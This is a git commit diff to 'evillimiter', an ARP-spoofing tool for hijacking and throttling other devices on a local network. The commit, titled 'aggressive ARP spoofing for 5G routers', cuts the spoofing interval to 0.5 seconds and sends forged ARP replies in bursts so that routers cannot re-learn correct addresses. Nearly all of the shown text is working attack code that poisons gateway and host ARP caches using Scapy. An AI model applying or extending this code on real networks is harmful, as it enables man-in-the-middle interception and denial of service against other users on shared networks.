3a1cfbc61a57244a3ec781828c9bb82a781a50ab
Jordannst <s22310272@student.unklab.ac.id>
2026-02-13 01:32:48 +0800

    feat(spoof): aggressive ARP spoofing for 5G routers

--- evillimiter/networking/spoof.py
+++ evillimiter/networking/spoof.py
@@ -7,13 +7,18 @@ from evillimiter.common.globals import BROADCAST
 
 
 class ARPSpoofer(object):
-    def __init__(self, interface, gateway_ip, gateway_mac):
+    def __init__(self, interface, gateway_ip, gateway_mac, interval=0.5, burst_count=3):
         self.interface = interface
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
 
-        # interval in s spoofed ARP packets are sent to targets
-        self.interval = 2
+        # interval in seconds between spoofed ARP packet cycles
+        # default 0.5s (aggressive) to outpace 5G router ARP re-verification
+        self.interval = interval
+
+        # number of times each ARP packet is sent per cycle
+        # burst helps overwhelm the router's ARP cache before it can re-learn
+        self.burst_count = burst_count
 
         self._hosts = set()
         self._hosts_lock = threading.Lock()
@@ -60,21 +65,23 @@ class ARPSpoofer(object):
 
     def _send_spoofed_packets(self, host):
         # 2 packets = 1 gateway packet, 1 host packet
+        # each sent burst_count times to win the ARP race condition
         packets = [
             ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
             ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac)
         ]
 
-        [send(x, verbose=0, iface=self.interface) for x in packets]
+        [send(x, verbose=0, iface=self.interface, count=self.burst_count) for x in packets]
 
     def _restore(self, host):
         """
         Remaps host and gateway to their actual addresses
         """
         # 2 packets = 1 gateway packet, 1 host packet
+        # sent with higher count to ensure restoration sticks
         packets = [
             ARP(op=2, psrc=host.ip, hwsrc=host.mac, pdst=self.gateway_ip, hwdst=BROADCAST),
             ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST)
         ]
 
-        [send(x, verbose=0, iface=self.interface, count=3) for x in packets]
+        [send(x, verbose=0, iface=self.interface, count=5) for x in packets]
